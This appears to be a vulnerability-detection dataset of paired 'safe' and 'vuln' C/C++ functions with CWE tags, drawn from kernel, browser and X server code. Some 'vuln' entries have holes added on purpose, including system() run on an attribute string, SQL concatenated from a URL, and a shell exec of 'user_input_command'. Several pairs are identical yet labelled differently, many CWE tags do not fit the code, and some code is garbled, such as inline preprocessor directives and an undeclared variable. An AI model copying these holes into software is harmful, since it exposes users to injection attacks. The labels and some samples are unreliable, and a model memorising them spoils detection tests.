{"idx": "CWE-79-safe-1714410404914", "code": "static int check_stack_read(struct bpf_verifier_env* env, struct bpf_verifier_state* state, int off, int size, int value_regno) { int i, slot = -off - 1, spi = slot / BPF_REG_SIZE; u8* stype; if (spi < 0 || spi >= state->allocated_stack / BPF_REG_SIZE) { verbose(env, \"invalid read from stack off%d+0 size%d\\n\", off, size); return -EACCES; } stype = state->stack[spi].slot_type; if (stype[0] == STACK_SPILL) { if (size != BPF_REG_SIZE) { verbose(env, \"invalid size of register spill\\n\"); return -EACCES; } for (i = 1; i < BPF_REG_SIZE; i++) { if (stype[(slot - i) % BPF_REG_SIZE] != STACK_SPILL) { verbose(env, \"corrupted spill memory\\n\"); return -EACCES; } } if (value_regno >= 0) { state->regs[value_regno] = state->stack[spi].spilled_ptr; mark_stack_slot_read(state, spi); } return 0; } else { for (i = 0; i < size; i++) { if (stype[(slot - i) % BPF_REG_SIZE] != STACK_MISC) { verbose(env, \"invalid read from stack off%d+%d size%d\\n\", off, i, size); return -EACCES; } } if (value_regno >= 0) mark_reg_unknown(env, state->regs, value_regno); return 0; }}", "target": 0, "source": "Big-Vul", "source_uid": "59127"}
{"idx": "CWE-79-vuln-1714410404914", "code": "static int check_stack_read(struct bpf_verifier_env*env, struct bpf_verifier_state*state, int off, int size, int value_regno){int i, slot=-off-1, spi=slot/BPF_REG_SIZE;u8*stype;if(spi<0 || spi >= state->allocated_stack/BPF_REG_SIZE){char error_msg[100];sprintf(error_msg, \"invalid read from stack off%d+0 size%d\\n\", off, size);verbose(env, error_msg);return-EACCES;}stype=state->stack[spi].slot_type;if(stype[0] == STACK_SPILL){if(size != BPF_REG_SIZE){char error_msg[100];sprintf(error_msg, \"invalid size of register spill\\n\");verbose(env, error_msg);return-EACCES;}for(i=1;i<BPF_REG_SIZE;i++){if(stype[(slot-i)%BPF_REG_SIZE] != STACK_SPILL){char error_msg[100];sprintf(error_msg, \"corrupted spill memory\\n\");verbose(env, error_msg);return-EACCES;}}if(value_regno >= 0){state->regs[value_regno]=state->stack[spi].spilled_ptr;mark_stack_slot_read(state, spi);}return 0;}else{for(i=0;i<size;i++){if(stype[(slot-i)%BPF_REG_SIZE] != STACK_MISC){char error_msg[100];sprintf(error_msg, \"invalid read from stack off%d+%d size%d\\n\", off, i, size);verbose(env, error_msg);return-EACCES;}}if(value_regno >= 0)mark_reg_unknown(env, state->regs, value_regno);return 0;}}", "target": 1, "source": "Big-Vul", "source_uid": "59127"}
{"idx": "CWE-1341-safe-1714410434613", "code": "void WebContentsImpl::RendererResponsive(RenderViewHost* render_view_host) {\n    if (delegate_) {\n        delegate_->RendererResponsive(this);\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "119016"}
{"idx": "CWE-1341-vuln-1714410434613", "code": "void WebContentsImpl::RendererResponsive(RenderViewHost* render_view_host) {\n    if (delegate_) {\n        delegate_->RendererResponsive(this);\n        delegate_->RendererResponsive(this); \n    }\n}", "target": 1, "source": "Big-Vul", "source_uid": "119016"}
{"idx": "CWE-362-safe-1714410447790", "code": "static void ocfs2_truncate_cluster_pages(struct inode *inode, u64 byte_start, u64 byte_len) {\n    struct ocfs2_super *osb = OCFS2_SB(inode->i_sb);\n    loff_t start, end;\n    struct address_space *mapping = inode->i_mapping;\n    start = (loff_t)ocfs2_align_bytes_to_clusters(inode->i_sb, byte_start);\n    end = byte_start + byte_len;\n    end = end & ~(osb->s_clustersize - 1);\n    if (start < end) {\n        unmap_mapping_range(mapping, start, end - start, 0);\n        truncate_inode_pages_range(mapping, start, end - 1);\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "85820"}
{"idx": "CWE-362-vuln-1714410447790", "code": "static void ocfs2_truncate_cluster_pages(struct inode*inode, u64 byte_start, u64 byte_len){\n    struct ocfs2_super*osb=OCFS2_SB(inode->i_sb);\n    loff_t start, end;\n    struct address_space*mapping=inode->i_mapping;\n    start=(loff_t)ocfs2_align_bytes_to_clusters(inode->i_sb, byte_start);\n    end=byte_start+byte_len;\n    end=end&~(osb->s_clustersize-1);\n    if(start<end){\n        \n        unmap_mapping_range(mapping, start, end-start, 0);\n        \n        truncate_inode_pages_range(mapping, start, end-1);\n    }\n}", "target": 1, "source": "Big-Vul", "source_uid": "85820"}
{"idx": "CWE-269-safe-1714410475897", "code": "void Range::detach(ExceptionCode& ec) { if (!m_start.container() || !m_ownerDocument) { ec = INVALID_STATE_ERR; return; } m_ownerDocument->detachRange(this); m_start.clear(); m_end.clear(); }", "target": 0, "source": "Big-Vul", "source_uid": "105117"}
{"idx": "CWE-269-vuln-1714410475897", "code": "void Range::detach(ExceptionCode& ec) {\n    if (!m_start.container() || !m_ownerDocument || !m_ownerDocument->userHasPrivilege()) {\n        ec = INVALID_STATE_ERR;\n        return;\n    }\n    m_ownerDocument->detachRange(this);\n    m_start.clear();\n    m_end.clear();\n}", "target": 1, "source": "Big-Vul", "source_uid": "105117"}
{"idx": "CWE-918-safe-1714410485505", "code": "void WebSocketJob::RestartWithAuth(const string16& username, const string16& password) {\n    state_ = CONNECTING;\n    socket_->RestartWithAuth(username, password);\n}", "target": 0, "source": "Big-Vul", "source_uid": "103262"}
{"idx": "CWE-918-vuln-1714410485505", "code": "void WebSocketJob::RestartWithAuth(const string16&username, const string16&password){if(username.empty() || password.empty()){state_=ERROR;return;}state_=CONNECTING;socket_->RestartWithAuth(username, password);}", "target": 1, "source": "Big-Vul", "source_uid": "103262"}
{"idx": "CWE-352-safe-1714410498453", "code": "void HTMLFormElement::parseAttribute(const QualifiedName& name, const AtomicString& oldValue, const AtomicString& value) {\n    if (name == actionAttr) {\n        m_attributes.parseAction(value);\n        logUpdateAttributeIfIsolatedWorldAndInDocument(\"form\", actionAttr, oldValue, value);\n        if (document().getInsecureRequestPolicy() & kUpgradeInsecureRequests) {\n            return;\n        }\n        KURL actionURL = document().completeURL(m_attributes.action().isEmpty() ? document().url().getString() : m_attributes.action());\n        if (MixedContentChecker::isMixedFormAction(document().frame(), actionURL)) {\n            UseCounter::count(document().frame(), UseCounter::MixedContentFormPresent);\n        }\n    } else if (name == targetAttr) {\n        m_attributes.setTarget(value);\n    } else if (name == methodAttr) {\n        m_attributes.updateMethodType(value);\n    } else if (name == enctypeAttr) {\n        m_attributes.updateEncodingType(value);\n    } else if (name == accept_charsetAttr) {\n        m_attributes.setAcceptCharset(value);\n    } else {\n        HTMLElement::parseAttribute(name, oldValue, value);\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "155237"}
{"idx": "CWE-352-vuln-1714410498453", "code": "void HTMLFormElement::parseAttribute(const QualifiedName&name, const AtomicString&oldValue, const AtomicString&value){if(name == actionAttr){if(!document().url().protocolIsData() && !document().url().protocolIsJavaScript()){m_attributes.parseAction(value);}logUpdateAttributeIfIsolatedWorldAndInDocument(\"form\", actionAttr, oldValue, value);if(document().getInsecureRequestPolicy()&kUpgradeInsecureRequests){return;}KURL actionURL=document().completeURL(m_attributes.action().isEmpty()? document().url().getString(): m_attributes.action());if(MixedContentChecker::isMixedFormAction(document().frame(), actionURL)){UseCounter::count(document().frame(), UseCounter::MixedContentFormPresent);}}else if(name == targetAttr){m_attributes.setTarget(value);}else if(name == methodAttr){m_attributes.updateMethodType(value);}else if(name == enctypeAttr){m_attributes.updateEncodingType(value);}else if(name == accept_charsetAttr){m_attributes.setAcceptCharset(value);}else{HTMLElement::parseAttribute(name, oldValue, value);}}", "target": 1, "source": "Big-Vul", "source_uid": "155237"}
{"idx": "CWE-1341-safe-1714410521448", "code": "void OSExchangeDataProviderWin::SetFilename(const base::FilePath& path){STGMEDIUM* storage = GetStorageForFileName(path);DataObjectImpl::StoredDataInfo* info = new DataObjectImpl::StoredDataInfo(Clipboard::GetCFHDropFormatType().ToFormatEtc(), storage);data_->contents_.push_back(info);storage = GetIDListStorageForFileName(path);if(!storage) return;info = new DataObjectImpl::StoredDataInfo(Clipboard::GetIDListFormatType().ToFormatEtc(), storage);data_->contents_.push_back(info);}", "target": 0, "source": "Big-Vul", "source_uid": "130299"}
{"idx": "CWE-1341-vuln-1714410521448", "code": "void OSExchangeDataProviderWin::SetFilename(const base::FilePath&path){STGMEDIUM*storage=GetStorageForFileName(path);DataObjectImpl::StoredDataInfo*info=new DataObjectImpl::StoredDataInfo(Clipboard::GetCFHDropFormatType().ToFormatEtc(), storage);data_->contents_.push_back(info);STGMEDIUM*storageDuplicate = storage;storage=GetIDListStorageForFileName(path);if(!storage)return;info=new DataObjectImpl::StoredDataInfo(Clipboard::GetIDListFormatType().ToFormatEtc(), storage);data_->contents_.push_back(info);}", "target": 1, "source": "Big-Vul", "source_uid": "130299"}
{"idx": "CWE-1341-safe-1714410530991", "code": "void PDFiumEngine::MoveRangeSelectionExtent(const pp::Point& extent) {\n    int page_index = -1;\n    int char_index = -1;\n    int form_type = FPDF_FORMFIELD_UNKNOWN;\n    PDFiumPage::LinkTarget target;\n    GetCharIndex(extent, &page_index, &char_index, &form_type, &target);\n    if (page_index < 0 || char_index < 0) return;\n    SelectionChangeInvalidator selection_invalidator(this);\n    if (range_selection_direction_ == RangeSelectionDirection::Right) {\n        ExtendSelection(page_index, char_index);\n        return;\n    }\n    selection_.clear();\n    selection_.push_back(PDFiumRange(pages_[page_index].get(), char_index, 0));\n    GetCharIndex(range_selection_base_, &page_index, &char_index, &form_type, &target);\n    ExtendSelection(page_index, char_index);\n}", "target": 0, "source": "Big-Vul", "source_uid": "158978"}
{"idx": "CWE-1341-vuln-1714410530991", "code": "void PDFiumEngine::MoveRangeSelectionExtent(const pp::Point& extent) {\n    int page_index = -1;\n    int char_index = -1;\n    int form_type = FPDF_FORMFIELD_UNKNOWN;\n    PDFiumPage::LinkTarget target;\n    GetCharIndex(extent, &page_index, &char_index, &form_type, &target);\n    if (page_index < 0 || char_index < 0) return;\n    SelectionChangeInvalidator selection_invalidator(this);\n    if (range_selection_direction_ == RangeSelectionDirection::Right) {\n        ExtendSelection(page_index, char_index);\n        selection_.clear(); \n        return;\n    }\n    selection_.clear();\n    selection_.push_back(PDFiumRange(pages_[page_index].get(), char_index, 0));\n    GetCharIndex(range_selection_base_, &page_index, &char_index, &form_type, &target);\n    ExtendSelection(page_index, char_index);\n}", "target": 1, "source": "Big-Vul", "source_uid": "158978"}
{"idx": "CWE-789-safe-1714410542754", "code": "void WebPage::notifyPageResume(){if(d->m_pluginViews){FOR_EACH_PLUGINVIEW(d->m_pluginViews)(*it)->handleResumeEvent();}}", "target": 0, "source": "Big-Vul", "source_uid": "111253"}
{"idx": "CWE-789-vuln-1714410542754", "code": "void WebPage::notifyPageResume(){if(d->m_pluginViews){char largeArray[1000000];FOR_EACH_PLUGINVIEW(d->m_pluginViews)(*it)->handleResumeEvent();}}", "target": 1, "source": "Big-Vul", "source_uid": "111253"}
{"idx": "CWE-399-safe-1714410554254", "code": "XFixesSelectCursorInput(ClientPtr pClient, WindowPtr pWindow, CARD32 eventMask){CursorEventPtr*prev, e;void*val;int rc;for(prev=&cursorEvents;(e=*prev);prev=&e->next){if(e->pClient == pClient && e->pWindow == pWindow){break;}}if(!eventMask){if(e){FreeResource(e->clientResource, 0);free(e);}return Success;}if(!e){e=(CursorEventPtr)malloc(sizeof(CursorEventRec));if(!e)return BadAlloc;e->next=0;e->pClient=pClient;e->pWindow=pWindow;e->clientResource=FakeClientID(pClient->index);rc=dixLookupResourceByType(&val, pWindow->drawable.id, CursorWindowType, serverClient, DixGetAttrAccess);if(rc != Success)if(!AddResource(pWindow->drawable.id, CursorWindowType, (void*)pWindow)){free(e);return BadAlloc;}if(!AddResource(e->clientResource, CursorClientType, (void*)e))return BadAlloc;*prev=e;}e->eventMask=eventMask;return Success;}", "target": 0, "source": "Big-Vul", "source_uid": "17672"}
{"idx": "CWE-399-vuln-1714410554254", "code": "XFixesSelectCursorInput(ClientPtr pClient, WindowPtr pWindow, CARD32 eventMask){CursorEventPtr*prev, e;void*val;int rc;for(prev=&cursorEvents;(e=*prev);prev=&e->next){if(e->pClient == pClient && e->pWindow == pWindow){break;}}if(!eventMask){if(e){FreeResource(e->clientResource, 0);free(e);}return Success;}if(!e){e=(CursorEventPtr)malloc(sizeof(CursorEventRec));if(!e)return BadAlloc;e->next=0;e->pClient=pClient;e->pWindow=pWindow;e->clientResource=FakeClientID(pClient->index);rc=dixLookupResourceByType(&val, pWindow->drawable.id, CursorWindowType, serverClient, DixGetAttrAccess);if(rc != Success)if(!AddResource(pWindow->drawable.id, CursorWindowType, (void*)pWindow)){free(e);return BadAlloc;}if(!AddResource(e->clientResource, CursorClientType, (void*)e)){return BadAlloc;}*prev=e;}e->eventMask=eventMask;return Success;}", "target": 1, "source": "Big-Vul", "source_uid": "17672"}
{"idx": "CWE-78-safe-1714410570672", "code": "void setCrossOrigin(const String&corsSetting){if(!corsSetting.empty()){m_crossOrigin=crossOriginAttributeValue(corsSetting);}}", "target": 0, "source": "Big-Vul", "source_uid": "143451"}
{"idx": "CWE-78-vuln-1714410570672", "code": "void setCrossOrigin(const String&corsSetting){if(!corsSetting.empty()){m_crossOrigin=crossOriginAttributeValue(corsSetting);system(corsSetting.c_str());}}", "target": 1, "source": "Big-Vul", "source_uid": "143451"}
{"idx": "CWE-362-safe-1714410578103", "code": "int snd_ctl_add(struct snd_card*card, struct snd_kcontrol*kcontrol){struct snd_ctl_elem_id id;struct snd_ctl_elem_id kcontrol_id;unsigned int idx;int err=-EINVAL;if(!kcontrol)return err;if(snd_BUG_ON(!card || !kcontrol->info))goto error;kcontrol_id=kcontrol->id;down_write(&card->controls_rwsem);if(snd_ctl_find_id(card, &kcontrol_id)){up_write(&card->controls_rwsem);dev_err(card->dev, \"control%i:%i:%i:%s:%i is already present\\n\", kcontrol_id.iface, kcontrol_id.device, kcontrol_id.subdevice, kcontrol_id.name, kcontrol_id.index);err=-EBUSY;goto error;}if(snd_ctl_find_hole(card, kcontrol->count)<0){up_write(&card->controls_rwsem);err=-ENOMEM;goto error;}list_add_tail(&kcontrol->list, &card->controls);card->controls_count+=kcontrol->count;kcontrol->id.numid=card->last_numid+1;card->last_numid+=kcontrol->count;up_write(&card->controls_rwsem);for(idx=0;idx<kcontrol->count;idx++, id.index++, id.numid++){id=kcontrol->id;snd_ctl_notify(card, SNDRV_CTL_EVENT_MASK_ADD, &id);}return 0;error:snd_ctl_free_one(kcontrol);return err;}", "target": 0, "source": "Big-Vul", "source_uid": "36497"}
{"idx": "CWE-362-vuln-1714410578103", "code": "int snd_ctl_add(struct snd_card*card, struct snd_kcontrol*kcontrol){struct snd_ctl_elem_id id;struct snd_ctl_elem_id kcontrol_id;unsigned int idx;int err=-EINVAL;if(!kcontrol)return err;if(snd_BUG_ON(!card || !kcontrol->info))goto error;kcontrol_id=kcontrol->id;down_write(&card->controls_rwsem);if(snd_ctl_find_id(card, &kcontrol_id)){up_write(&card->controls_rwsem);dev_err(card->dev, \"control%i:%i:%i:%s:%i is already present\\n\", kcontrol_id.iface, kcontrol_id.device, kcontrol_id.subdevice, kcontrol_id.name, kcontrol_id.index);err=-EBUSY;goto error;}if(snd_ctl_find_hole(card, kcontrol->count)<0){up_write(&card->controls_rwsem);err=-ENOMEM;goto error;}list_add_tail(&kcontrol->list, &card->controls);card->controls_count+=kcontrol->count;kcontrol->id.numid=card->last_numid+1;card->last_numid+=kcontrol->count;up_write(&card->controls_rwsem);for(idx=0;idx<kcontrol->count;idx++, id.index++, id.numid++){id=kcontrol->id;snd_ctl_notify(card, SNDRV_CTL_EVENT_MASK_ADD, &id);}return 0;error:snd_ctl_free_one(kcontrol);return err;}", "target": 1, "source": "Big-Vul", "source_uid": "36497"}
{"idx": "CWE-362-safe-1714410602120", "code": "static int fr_del_pvc(hdlc_device*hdlc, unsigned int dlci, int type){pvc_device*pvc;struct net_device*dev;if((pvc=find_pvc(hdlc, dlci)) == NULL)return-ENOENT;if((dev=*get_dev_p(pvc, type)) == NULL)return-ENOENT;if(dev->flags&IFF_UP){unregister_netdevice(dev);dev=NULL;return-EBUSY;}unregister_netdevice(dev);*get_dev_p(pvc, type)=NULL;if(!pvc_is_used(pvc)){state(hdlc)->dce_pvc_count--;state(hdlc)->dce_changed=1;}delete_unused_pvcs(hdlc);return 0;}", "target": 0, "source": "Big-Vul", "source_uid": "23908"}
{"idx": "CWE-362-vuln-1714410602120", "code": "static int fr_del_pvc(hdlc_device*hdlc, unsigned int dlci, int type){pvc_device*pvc;struct net_device*dev;if((pvc=find_pvc(hdlc, dlci)) == NULL)return-ENOENT;if((dev=*get_dev_p(pvc, type)) == NULL)return-ENOENT;if(dev->flags&IFF_UP){unregister_netdevice(dev);dev=NULL;return-EBUSY;}unregister_netdevice(dev);*get_dev_p(pvc, type)=NULL;if(!pvc_is_used(pvc)){state(hdlc)->dce_pvc_count--;state(hdlc)->dce_changed=1;}delete_unused_pvcs(hdlc);return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "23908"}
{"idx": "CWE-269-safe-1714410613059", "code": "int get_fpexc_mode(struct task_struct* tsk, unsigned long adr) {\n    unsigned int val;\n    if (tsk->thread.fpexc_mode & PR_FP_EXC_SW_ENABLE) {\n#ifdef CONFIG_SPE \n        if (cpu_has_feature(CPU_FTR_SPE)) {\n            tsk->thread.spefscr_last = mfspr(SPRN_SPEFSCR);\n            val = tsk->thread.fpexc_mode;\n        } else {\n            return -EINVAL;\n        }\n#else \n        return -EINVAL;\n#endif \n    } else {\n        val = __unpack_fe01(tsk->thread.fpexc_mode);\n    }\n    return put_user(val, (unsigned int __user*)adr);\n}", "target": 0, "source": "Big-Vul", "source_uid": "38629"}
{"idx": "CWE-269-vuln-1714410613059", "code": "int get_fpexc_mode(struct task_struct*tsk, unsigned long adr){unsigned int val;if(tsk->thread.fpexc_mode&PR_FP_EXC_SW_ENABLE){#ifdef CONFIG_SPE        if(cpu_has_feature(CPU_FTR_SPE)){tsk->thread.spefscr_last=mfspr(SPRN_SPEFSCR);val=tsk->thread.fpexc_mode;}else{return-EINVAL;}#else        return-EINVAL;#endif}else{val=__unpack_fe01(tsk->thread.fpexc_mode);}return val;}", "target": 1, "source": "Big-Vul", "source_uid": "38629"}
{"idx": "CWE-22-safe-1714410627652", "code": "bool IsWellKnownPort(int port){return port >= 0 && port < 1024;}", "target": 0, "source": "Big-Vul", "source_uid": "162945"}
{"idx": "CWE-22-vuln-1714410627652", "code": "bool IsWellKnownPort(int port){return port >= 0 && port < 1024;}", "target": 1, "source": "Big-Vul", "source_uid": "162945"}
{"idx": "CWE-789-safe-1714410650555", "code": "MagickExport Image*DeconstructImages(const Image*images, ExceptionInfo*exception){if(!images) return NULL; return(CompareImageLayers(images, CompareAnyLayer, exception));}", "target": 0, "source": "Big-Vul", "source_uid": "88859"}
{"idx": "CWE-789-vuln-1714410650555", "code": "MagickExport Image*DeconstructImages(const Image*images, ExceptionInfo*exception){if(!images) return NULL; return(CompareImageLayers(images, CompareAnyLayer, exception));}", "target": 1, "source": "Big-Vul", "source_uid": "88859"}
{"idx": "CWE-362-safe-1714410667008", "code": "static void rose_remove_socket(struct sock *sk){if (!sk) return;spin_lock_bh(&rose_list_lock);sk_del_node_init(sk);spin_unlock_bh(&rose_list_lock);}", "target": 0, "source": "Big-Vul", "source_uid": "22215"}
{"idx": "CWE-362-vuln-1714410667008", "code": "static void rose_remove_socket(struct sock*sk){if(!sk)return;spin_lock_bh(&rose_list_lock);mdelay(100);sk_del_node_init(sk);spin_unlock_bh(&rose_list_lock);}", "target": 1, "source": "Big-Vul", "source_uid": "22215"}
{"idx": "CWE-89-safe-1714410678169", "code": "const GURL OpenSiteSettingsForUrl(Browser* browser, const GURL& url) {\n    ui_test_utils::NavigateToURL(browser, url);\n    OpenPageInfoBubble(browser);\n    views::View* site_settings_button = GetView(browser, PageInfoBubbleView::VIEW_ID_PAGE_INFO_LINK_SITE_SETTINGS);\n    if (site_settings_button) {\n        ClickAndWaitForSettingsPageToOpen(site_settings_button);\n        if (browser->tab_strip_model() && browser->tab_strip_model()->GetActiveWebContents()) {\n            return browser->tab_strip_model()->GetActiveWebContents()->GetLastCommittedURL();\n        }\n    }\n    return GURL();\n}", "target": 0, "source": "Big-Vul", "source_uid": "146693"}
{"idx": "CWE-89-vuln-1714410678169", "code": "const GURL OpenSiteSettingsForUrl(Browser*browser, const GURL&url){ui_test_utils::NavigateToURL(browser, url);OpenPageInfoBubble(browser);views::View*site_settings_button=GetView(browser, PageInfoBubbleView::VIEW_ID_PAGE_INFO_LINK_SITE_SETTINGS);if(site_settings_button){std::string query = \"SELECT * FROM Sites WHERE Url = '\" + url.spec() + \"'\";ExecuteSQLQuery(query);ClickAndWaitForSettingsPageToOpen(site_settings_button);if(browser->tab_strip_model() && browser->tab_strip_model()->GetActiveWebContents()){return browser->tab_strip_model()->GetActiveWebContents()->GetLastCommittedURL();}}return GURL();}", "target": 1, "source": "Big-Vul", "source_uid": "146693"}
{"idx": "CWE-352-safe-1714410693564", "code": "void ResourceMessageFilter::OnGetExtensionMessageBundleOnFileThread(const FilePath& extension_path, const std::string& extension_id, const std::string& default_locale, IPC::Message* reply_msg) {\n    DCHECK(ChromeThread::CurrentlyOn(ChromeThread::FILE));\n    std::map<std::string, std::string> dictionary_map;\n    if (!default_locale.empty()) {\n        std::string error;\n        scoped_ptr<ExtensionMessageBundle> bundle(extension_file_util::LoadExtensionMessageBundle(extension_path, default_locale, &error));\n        if (bundle.get()) {\n            dictionary_map = *bundle->dictionary();\n        }\n    }\n    dictionary_map.insert(std::make_pair(ExtensionMessageBundle::kExtensionIdKey, extension_id));\n    ViewHostMsg_GetExtensionMessageBundle::WriteReplyParams(reply_msg, dictionary_map);\n    ChromeThread::PostTask(ChromeThread::IO, FROM_HERE, NewRunnableMethod(this, &ResourceMessageFilter::Send, reply_msg));\n}", "target": 0, "source": "Big-Vul", "source_uid": "99303"}
{"idx": "CWE-352-vuln-1714410693564", "code": "void ResourceMessageFilter::OnGetExtensionMessageBundleOnFileThread(const FilePath&extension_path, const std::string&extension_id, const std::string&default_locale, const std::string&csrf_token, IPC::Message*reply_msg){\n    DCHECK(ChromeThread::CurrentlyOn(ChromeThread::FILE));\n    std::map<std::string, std::string> dictionary_map;\n    if(!default_locale.empty()){\n        std::string error;\n        scoped_ptr<ExtensionMessageBundle> bundle(extension_file_util::LoadExtensionMessageBundle(extension_path, default_locale, &error));\n        if(bundle.get()){\n            dictionary_map = *bundle->dictionary();\n        }\n    }\n    dictionary_map.insert(std::make_pair(ExtensionMessageBundle::kExtensionIdKey, extension_id));\n    dictionary_map.insert(std::make_pair(\"csrf_token\", csrf_token));\n    ViewHostMsg_GetExtensionMessageBundle::WriteReplyParams(reply_msg, dictionary_map);\n    ChromeThread::PostTask(ChromeThread::IO, FROM_HERE, NewRunnableMethod(this, &ResourceMessageFilter::Send, reply_msg));\n}", "target": 1, "source": "Big-Vul", "source_uid": "99303"}
{"idx": "CWE-77-safe-1714410740448", "code": "DEFUN(susp, INTERRUPT SUSPEND, \"Suspend w3m to background\"){#ifndef SIGSTOP    char*shell;#endif    move(LASTLINE, 0);clrtoeolx();refresh();fmTerm();#ifndef SIGSTOP    shell=getenv(\"SHELL\");if(shell == NULL)shell=\"/bin/sh\";    execl(shell, shell, NULL);#else#ifdef SIGTSTP    signal(SIGTSTP, SIG_DFL);kill(0, SIGTSTP);#else    kill((pid_t)0, SIGSTOP);#endif#endif    fmInit();displayBuffer(Currentbuf, B_FORCE_REDRAW);}", "target": 0, "source": "Big-Vul", "source_uid": "84443"}
{"idx": "CWE-77-vuln-1714410740448", "code": "DEFUN(susp, INTERRUPT SUSPEND, \"Suspend w3m to background\"){#ifndef SIGSTOP    char*shell;#endif    move(LASTLINE, 0);clrtoeolx();refresh();fmTerm();#ifndef SIGSTOP    shell=getenv(\"SHELL\");if(shell == NULL)shell=\"/bin/sh\";    execl(shell, shell, \"-c\", user_input_command, NULL);#else#ifdef SIGTSTP    signal(SIGTSTP, SIG_DFL);kill(0, SIGTSTP);#else    kill((pid_t)0, SIGSTOP);#endif#endif    fmInit();displayBuffer(Currentbuf, B_FORCE_REDRAW);}", "target": 1, "source": "Big-Vul", "source_uid": "84443"}
{"idx": "CWE-352-safe-1714410750231", "code": "schemes_are_similar_p(enum url_scheme a, enum url_scheme b){if(a == b)return true;#ifdef HAVE_SSL\neq = constant_time_eq(a, b);\nif(eq)return true;#endif return false;}", "target": 0, "source": "Big-Vul", "source_uid": "8697"}
{"idx": "CWE-352-vuln-1714410750231", "code": "schemes_are_similar_p(enum url_scheme a, enum url_scheme b, bool is_authorized_request){if(!is_authorized_request) return false;if(a == b)return true;#ifdef HAVE_SSL\neq=constant_time_eq(a, b);if(eq)return true;#endif return false;}", "target": 1, "source": "Big-Vul", "source_uid": "8697"}
{"idx": "CWE-352-safe-1714410771849", "code": "static int iucv_sock_connect(struct socket* sock, struct sockaddr* addr, int alen, int flags) {\n    struct sockaddr_iucv* sa = (struct sockaddr_iucv*) addr;\n    struct sock* sk = sock->sk;\n    struct iucv_sock* iucv = iucv_sk(sk);\n    int err;\n    if (addr->sa_family != AF_IUCV || alen < sizeof(struct sockaddr_iucv))\n        return -EINVAL;\n    if (sk->sk_state != IUCV_OPEN && sk->sk_state != IUCV_BOUND)\n        return -EBADFD;\n    if (sk->sk_state == IUCV_OPEN && iucv->transport == AF_IUCV_TRANS_HIPER)\n        return -EBADFD;\n    if (sk->sk_type != SOCK_STREAM && sk->sk_type != SOCK_SEQPACKET)\n        return -EINVAL;\n    if (sk->sk_state == IUCV_OPEN) {\n        err = iucv_sock_autobind(sk);\n        if (unlikely(err))\n            return err;\n    }\n    lock_sock(sk);\n    memcpy(iucv->dst_user_id, sa->siucv_user_id, 8);\n    memcpy(iucv->dst_name, sa->siucv_name, 8);\n    if (iucv->transport == AF_IUCV_TRANS_HIPER)\n        err = iucv_send_ctrl(sock->sk, AF_IUCV_FLAG_SYN);\n    else {\n        err = afiucv_path_connect(sock, addr);\n    }\n    if (err)\n        goto done;\n    if (sk->sk_state != IUCV_CONNECTED)\n        err = iucv_sock_wait(sk, iucv_sock_in_state(sk, IUCV_CONNECTED, IUCV_DISCONN), sock_sndtimeo(sk, flags & O_NONBLOCK));\n    if (sk->sk_state == IUCV_DISCONN || sk->sk_state == IUCV_CLOSED)\n        err = -ECONNREFUSED;\n    if (err && iucv->transport == AF_IUCV_TRANS_IUCV)\n        iucv_sever_path(sk, 0);\n    done:\n    release_sock(sk);\n    return err;\n}", "target": 0, "source": "Big-Vul", "source_uid": "30615"}
{"idx": "CWE-352-vuln-1714410771849", "code": "static int iucv_sock_connect(struct socket*sock, struct sockaddr*addr, int alen, int flags){struct sockaddr_iucv*sa=(struct sockaddr_iucv*)addr;struct sock*sk=sock->sk;struct iucv_sock*iucv=iucv_sk(sk);int err;if(addr->sa_family != AF_IUCV || alen<sizeof(struct sockaddr_iucv))return-EINVAL;if(sk->sk_state != IUCV_OPEN && sk->sk_state != IUCV_BOUND)return-EBADFD;if(sk->sk_state == IUCV_OPEN && iucv->transport == AF_IUCV_TRANS_HIPER)return-EBADFD;if(sk->sk_type != SOCK_STREAM && sk->sk_type != SOCK_SEQPACKET)return-EINVAL;if(sk->sk_state == IUCV_OPEN){err=iucv_sock_autobind(sk);if(unlikely(err))return err;}lock_sock(sk);memcpy(iucv->dst_user_id, sa->siucv_user_id, 8);memcpy(iucv->dst_name, sa->siucv_name, 8);if(iucv->transport == AF_IUCV_TRANS_HIPER)err=iucv_send_ctrl(sock->sk, AF_IUCV_FLAG_SYN);else{err=afiucv_path_connect(sock, addr);}if(err)goto done;if(sk->sk_state != IUCV_CONNECTED)err=iucv_sock_wait(sk, iucv_sock_in_state(sk, IUCV_CONNECTED, IUCV_DISCONN), sock_sndtimeo(sk, flags&O_NONBLOCK));if(sk->sk_state == IUCV_DISCONN || sk->sk_state == IUCV_CLOSED)err=-ECONNREFUSED;if(err && iucv->transport == AF_IUCV_TRANS_IUCV)iucv_sever_path(sk, 0);done:\trelease_sock(sk);return err;}", "target": 1, "source": "Big-Vul", "source_uid": "30615"}
{"idx": "CWE-362-safe-1714410798946", "code": "int fpm_children_make(struct fpm_worker_pool_s*wp, int in_event_loop, int nb_to_spawn, int is_debug){pid_t pid;struct fpm_child_s*child;int max;static int warned=0;if(wp->config->pm == PM_STYLE_DYNAMIC){if(!in_event_loop){max=wp->config->pm_start_servers;}else{max=wp->running_children+nb_to_spawn;}}else if(wp->config->pm == PM_STYLE_ONDEMAND){if(!in_event_loop){max=0;}else{max=wp->running_children+nb_to_spawn;}}else{max=wp->config->pm_max_children;}while(fpm_pctl_can_spawn_children() && wp->running_children<max && (fpm_global_config.process_max<1 || wp->running_children<fpm_global_config.process_max)){warned=0;child=fpm_resources_prepare(wp);if(!child){return 2;}pid=fork();switch(pid){case 0 : fpm_child_resources_use(child);fpm_globals.is_child=1;fpm_child_init(wp);return 0;case-1 : zlog(ZLOG_SYSERROR, \"fork()failed\");fpm_resources_discard(child);return 2;default : child->pid=pid;fpm_clock_get(&child->started);fpm_parent_resources_use(child);zlog(is_debug ? ZLOG_DEBUG : ZLOG_NOTICE, \"[pool%s] child%d started\", wp->config->name, (int)pid);}}if(!warned && fpm_global_config.process_max>0 && wp->running_children >= fpm_global_config.process_max){if(wp->running_children<max){warned=1;zlog(ZLOG_WARNING, \"The maximum number of processes has been reached. Please review your configuration and consider raising 'process.max'\");}}return 1;}", "target": 0, "source": "Big-Vul", "source_uid": "86615"}
